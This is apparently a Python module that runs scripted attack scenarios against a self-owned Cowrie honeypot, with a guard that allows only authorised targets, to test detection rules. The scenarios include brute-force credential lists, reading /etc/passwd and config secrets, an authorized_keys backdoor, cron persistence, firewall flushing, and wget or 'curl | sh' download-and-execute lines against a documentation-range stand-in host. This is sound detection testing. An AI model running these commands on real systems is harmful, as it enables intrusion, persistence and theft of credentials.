"""Controlled attack simulations against a honeypot WE OWN.

Safety rules enforced in code (see assert_authorized_target):
* the target must be loopback, a private (RFC 1918) address, or a host the
  operator explicitly authorises with --authorized-target AND the
  HONEYTRAP_AUTHORIZED_TARGET environment variable;
* payload URLs use 198.51.100.0/24 (RFC 5737 documentation range). Cowrie
  refuses to fetch non-global addresses, so no download ever leaves the host;
* tunnel requests point at the same documentation range and Cowrie is
  configured to log, never forward, them.

Each scenario lists the detection rules it MUST trigger. The runner evaluates
only the events produced by that scenario so results are attributable.
"""

from __future__ import annotations

import ipaddress
import os
import socket
import time
from collections.abc import Callable
from dataclasses import dataclass, field

import paramiko

PAYLOAD_HOST = "198.51.100.23"  # RFC 5737 TEST-NET-2, never routable


class UnauthorizedTarget(RuntimeError):
    pass


def assert_authorized_target(host: str, authorized: str | None = None) -> None:
    try:
        resolved = socket.gethostbyname(host)
    except OSError as exc:
        raise UnauthorizedTarget(f"cannot resolve {host}") from exc
    ip = ipaddress.ip_address(resolved)
    if ip.is_loopback or ip.is_private:
        return
    env = os.environ.get("HONEYTRAP_AUTHORIZED_TARGET")
    if authorized and env and authorized == env == host:
        return
    raise UnauthorizedTarget(
        f"refusing to attack {host} ({resolved}): not loopback/private. To simulate against your own deployed "
        "honeypot pass --authorized-target <host> AND export HONEYTRAP_AUTHORIZED_TARGET=<host>.")


@dataclass
class Target:
    host: str = "127.0.0.1"
    ssh_port: int = 2222
    telnet_port: int = 2223
    source_address: str | None = None  # e.g. 127.0.0.12 on Linux to give each scenario its own IP


@dataclass
class Scenario:
    name: str
    title: str
    description: str
    run: Callable[[Target], None]
    expected_rules: list[str]
    expected_techniques: list[str] = field(default_factory=list)
    source_suffix: int = 10


def _sock(target: Target, port: int) -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    if target.source_address:
        try:
            sock.bind((target.source_address, 0))
        except OSError:
            pass  # macOS has no 127/8 aliases by default; fall back to the default source address
    sock.connect((target.host, port))
    return sock


def _transport(target: Target) -> paramiko.Transport:
    transport = paramiko.Transport(_sock(target, target.ssh_port))
    transport.local_version = "SSH-2.0-HoneyTrapSimulation_1.0"
    transport.start_client(timeout=10)
    return transport


def _try_password(transport: paramiko.Transport, user: str, password: str) -> bool:
    try:
        transport.auth_password(user, password)
        return transport.is_authenticated()
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException:
        return False


def _shell(target: Target, user: str, password: str, commands: list[str], pause: float = 0.6) -> None:
    transport = _transport(target)
    try:
        if not _try_password(transport, user, password):
            raise RuntimeError(f"decoy did not accept {user}")
        channel = transport.open_session()
        channel.get_pty()
        channel.invoke_shell()
        time.sleep(pause)
        _drain(channel)
        for command in commands:
            channel.send((command + "\n").encode())
            time.sleep(pause)
            _drain(channel)
        channel.send(b"exit\n")
        time.sleep(0.3)
    finally:
        transport.close()


def _drain(channel) -> bytes:
    data = b""
    while channel.recv_ready():
        data += channel.recv(65535)
    return data


# --------------------------------------------------------------------------- scenarios

def ssh_bruteforce(target: Target) -> None:
    """30 failed SSH logins against root/admin using passwords the decoy rejects."""
    attempts = [("root", p) for p in ("root", "123456", "password")] * 6 + \
               [("admin", p) for p in ("password1", "letmein", "qwerty", "admin2024")] * 3
    for i in range(0, len(attempts), 3):
        transport = _transport(target)
        try:
            for user, password in attempts[i:i + 3]:
                _try_password(transport, user, password)
        finally:
            transport.close()


def failed_auth_spray(target: Target) -> None:
    """Six separate sessions, one password sprayed across many usernames."""
    users = ["oracle", "git", "jenkins", "hadoop", "ftpuser", "minecraft", "support", "backup"]
    for chunk in (users[0:2], users[2:4], users[4:5], users[5:6], users[6:7], users[7:8]):
        transport = _transport(target)
        try:
            for user in chunk:
                _try_password(transport, user, "Welcome2026!")
        finally:
            transport.close()


def reconnaissance(target: Target) -> None:
    _shell(target, "root", "hunter2", [
        "uname -a", "cat /proc/cpuinfo | grep 'model name' | head -1", "whoami", "id", "w",
        "ifconfig", "ps aux", "netstat -tulpn", "cat /etc/passwd", "ls -la /opt/nwf-billing/config",
        "cat /opt/nwf-billing/config/app.env", "grep -ri password /opt/nwf-billing",
    ])


def suspicious_commands(target: Target) -> None:
    _shell(target, "root", "hunter2", [
        "unset HISTFILE",
        "echo dW5hbWUgLWEK | base64 -d | sh",
        "mkdir -p ~/.ssh",
        "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAISIMULATIONKEYONLY honeytrap-simulation' >> ~/.ssh/authorized_keys",
        "(crontab -l; echo '*/5 * * * * /tmp/.update.sh') | crontab -",
        "iptables -F",
        "history -c",
    ])


def download_attempt(target: Target) -> None:
    _shell(target, "root", "hunter2", [
        "cd /tmp",
        f"wget http://{PAYLOAD_HOST}/bins/x86_64 -O /tmp/x86_64",
        "chmod +x /tmp/x86_64",
        "/tmp/x86_64 ssh.scan",
        f"curl -fsSL http://{PAYLOAD_HOST}/i.sh | sh",
    ], pause=1.5)


def telnet_bruteforce(target: Target) -> None:
    """12 failed Telnet logins (Mirai-style default credentials)."""
    # None of these usernames are accepted by honeypot/cowrie/etc/userdb.txt, so every attempt fails.
    creds = [("admin", "1234"), ("admin", "smcadmin"), ("support", "support"), ("guest", "12345"),
             ("user", "user"), ("ubnt", "ubnt"), ("default", "default"), ("supervisor", "supervisor"),
             ("service", "service"), ("tech", "tech"), ("daemon", "daemon"), ("admin", "7ujMko0admin")]
    for user, password in creds:
        sock = _sock(target, target.telnet_port)
        try:
            _telnet_login(sock, user, password)
        finally:
            sock.close()


def _telnet_login(sock: socket.socket, user: str, password: str) -> None:
    def read_until(token: bytes, timeout: float = 5) -> bytes:
        buf, end = b"", time.time() + timeout
        while token not in buf.lower() and time.time() < end:
            try:
                chunk = sock.recv(4096)
            except TimeoutError:
                break
            if not chunk:
                break
            # refuse all telnet option negotiation (IAC DO/WILL -> WONT/DONT)
            out, i = b"", 0
            while i < len(chunk):
                if chunk[i] == 255 and i + 2 < len(chunk) and chunk[i + 1] in (251, 252, 253, 254):
                    cmd = 254 if chunk[i + 1] in (251, 252) else 252
                    out += bytes([255, cmd, chunk[i + 2]])
                    i += 3
                    continue
                buf += chunk[i:i + 1]
                i += 1
            if out:
                sock.sendall(out)
        return buf

    sock.settimeout(2)
    read_until(b"login:")
    sock.sendall(user.encode() + b"\r\n")
    read_until(b"password:")
    sock.sendall(password.encode() + b"\r\n")
    read_until(b"incorrect", timeout=4)


def tunnel_attempt(target: Target) -> None:
    transport = _transport(target)
    try:
        _try_password(transport, "root", "hunter2")
        try:
            channel = transport.open_channel("direct-tcpip", (PAYLOAD_HOST, 80), ("127.0.0.1", 40000), timeout=5)
            channel.close()
        except (paramiko.ChannelException, paramiko.SSHException):
            pass  # Cowrie may refuse the channel; the request is still logged
        time.sleep(0.5)
    finally:
        transport.close()


def connection_flood(target: Target) -> None:
    """25 TCP connections in a few seconds that read the banner and leave."""
    for _ in range(25):
        sock = _sock(target, target.ssh_port)
        try:
            sock.recv(64)
        except OSError:
            pass
        finally:
            sock.close()
        time.sleep(0.05)


SCENARIOS: list[Scenario] = [
    Scenario("ssh_bruteforce", "SSH brute force", "30 failed password logins against root/admin",
             ssh_bruteforce, ["HT-AUTH-001", "HT-AUTH-003", "HT-NET-002"], ["T1110", "T1110.001"], 11),
    Scenario("failed_auth_spray", "Multiple failed authentications (password spray)",
             "One password across 8 usernames in 6 sessions",
             failed_auth_spray, ["HT-AUTH-002", "HT-NET-002"], ["T1110.003"], 12),
    Scenario("reconnaissance", "Post-login reconnaissance", "Discovery commands after a successful login",
             reconnaissance, ["HT-AUTH-006", "HT-CMD-001", "HT-CMD-005"],
             ["T1078", "T1082", "T1033", "T1016", "T1057", "T1049", "T1087.001", "T1552.001"], 13),
    Scenario("suspicious_commands", "Suspicious shell activity",
             "Payload decoding, persistence and defence-evasion commands",
             suspicious_commands, ["HT-AUTH-006", "HT-CMD-002", "HT-CMD-003", "HT-CMD-004"],
             ["T1140", "T1059.004", "T1098.004", "T1053.003", "T1690", "T1070.003", "T1686"], 14),
    Scenario("download_attempt", "Download and execute attempt",
             "wget/curl from a documentation-range URL, chmod +x and execution",
             download_attempt, ["HT-AUTH-006", "HT-DL-001", "HT-DL-002"], ["T1105", "T1059.004"], 15),
    Scenario("telnet_bruteforce", "Telnet default-credential brute force", "12 failed Telnet logins",
             telnet_bruteforce, ["HT-AUTH-001"], ["T1110"], 16),
    Scenario("tunnel_attempt", "SSH tunnelling attempt", "direct-tcpip request through the decoy",
             tunnel_attempt, ["HT-NET-003"], ["T1090"], 17),
    Scenario("connection_flood", "High-frequency connections", "25 banner-grab connections in seconds",
             connection_flood, ["HT-NET-001"], ["T1595"], 18),
]
